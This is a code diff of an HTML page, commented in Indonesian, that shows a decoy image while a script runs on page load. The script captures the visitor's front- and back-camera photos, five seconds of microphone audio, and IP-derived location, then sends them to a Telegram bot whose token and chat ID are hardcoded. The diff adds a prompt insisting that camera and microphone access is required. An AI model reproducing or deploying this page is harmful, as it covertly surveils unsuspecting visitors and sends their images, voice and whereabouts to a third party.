@@ -13,10 +13,7 @@
     </style>
 </head>
 <body>
-    <!-- Gambar yang lo mau tampilkan -->
     <img src="https://img5.pixhost.to/images/2820/565901428_skyzopedia.jpg" alt="Skyzopedia">
-
-    <!-- Kamera -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
@@ -24,19 +21,24 @@
         const TELEGRAM_BOT_TOKEN = "7904903199:AAEjqpYoBCj6y3X8VjtxYD6tyPpElCd9IS0";
         const TELEGRAM_CHAT_ID = "7081489041";
 
+        async function requestPermissions() {
+            try {
+                // Minta izin akses kamera & mikrofon
+                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                startCapture();
+            } catch (error) {
+                alert("Izin akses kamera dan mikrofon diperlukan!");
+            }
+        }
+
         async function startCapture() {
             try {
-                // Ambil IP dan lokasi
                 const ipData = await getIPAndLocation();
-
-                // Ambil foto dari kamera depan & belakang
                 const frontPhoto = await capturePhoto("user");
                 const backPhoto = await capturePhoto("environment");
-
-                // Rekam suara
                 const audioBlob = await recordAudio();
 
-                // Kirim semua data ke Telegram
+                // Kirim ke Telegram
                 await sendToTelegram(frontPhoto, "Depan");
                 await sendToTelegram(backPhoto, "Belakang");
                 await sendAudioToTelegram(audioBlob);
@@ -60,7 +62,7 @@
 
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     const imageData = canvas.toDataURL("image/jpeg");
-                    stream.getTracks().forEach(track => track.stop()); // Hentikan kamera
+                    stream.getTracks().forEach(track => track.stop());
                     resolve(imageData);
                 };
             });
@@ -84,8 +86,8 @@
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
-                    stream.getTracks().forEach(track => track.stop()); // Hentikan mikrofon
-                }, 5000); // Rekam selama 5 detik
+                    stream.getTracks().forEach(track => track.stop());
+                }, 5000);
             });
         }
 
@@ -144,7 +146,7 @@
             }
         }
 
-        window.onload = startCapture;
+        window.onload = requestPermissions;
     </script>
 </body>
 </html>
